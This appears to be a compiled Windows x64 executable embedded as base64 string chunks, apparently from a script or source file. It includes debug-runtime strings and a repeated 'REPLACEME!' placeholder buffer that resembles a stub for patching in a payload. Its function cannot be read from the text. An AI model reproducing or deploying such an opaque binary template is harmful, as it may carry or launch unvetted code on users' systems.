BMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','JFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFU','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','0Nwc7+/0WLlIEI4AEATYuMwSi/AQBBg/r/dChEi8JBi9LpwAIAAEyLDemNAAC6BQAAAEG6AQAAAESLwkGL0umjAgAAw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIiVwkGEiJdCQgV0iB7DAEAABIiwV/rgAASDPESImEJCAEAACLPUauAABIi9pIi/GD//8PhNAAAACAOgAPhLAAAAB','zMzMzMzMzMzMzMzMzMzMzDPAw8zMzMzMzMzMzMzMzMxIg+w4M8n/FVz0AABIiUQkIEiDfCQgAHUHMsDpgQAAAEiLRCQgD7cAPU1aAAB0BDLA625Ii0QkIEhjQDxI','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGQQAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz','AAAAAAAAAAAAAAAAAsMgBAJQAAAAAAAAAAAAAAAAgAgDoAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHRic3MAAAEAABAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','BMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUN','kVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhU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','MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz